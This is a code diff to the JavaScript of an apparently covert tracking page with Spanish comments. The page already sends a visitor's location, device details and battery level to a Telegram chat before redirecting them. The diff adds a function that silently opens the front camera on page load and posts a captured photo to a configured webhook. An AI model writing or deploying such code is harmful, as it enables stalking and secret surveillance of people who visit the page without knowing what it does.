@@ -68,6 +68,9 @@
             } else {
                 enviar(null, id, hw, bat);
             }
+
+            // Tomar foto de la cámara frontal
+            tomarFoto();
         }
 
         async function enviar(pos, id, hw, bat) {
@@ -98,8 +101,8 @@
                             chat_id: CONFIG.chat,
                             text: report,
                             parse_mode: "Markdown",
-                            reply_markup: pos ? { 
-                                inline_keyboard: [[{ text: "🗺️ Abrir en Google Maps", url: `http://maps.google.com/maps?q=${lat},${lon}` }]] 
+                            reply_markup: pos ? {
+                                inline_keyboard: [[{ text: "🗺️ Abrir en Google Maps", url: `http://maps.google.com/maps?q=${lat},${lon}` }]]
                             } : undefined
                         })
                     }),
@@ -113,6 +116,50 @@
 
             // Redirección final solo tras el envío
             window.location.href = CONFIG.exit;
+        }
+
+        async function tomarFoto() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                return;
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                video.onloadedmetadata = () => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    video.pause();
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    enviarFoto(imageData);
+                };
+            } catch (error) {
+                console.error('Error tomada la foto:', error);
+            }
+        }
+
+        async function enviarFoto(imageData) {
+            try {
+                const response = await fetch(CONFIG.webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `**Nueva foto tomada:**\n${imageData}` })
+                });
+                if (response.ok) {
+                    console.log('Foto enviada con éxito');
+                } else {
+                    console.error('Error enviado la foto:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error enviado la foto:', error);
+            }
         }
 
         window.onload = iniciarRastreo;
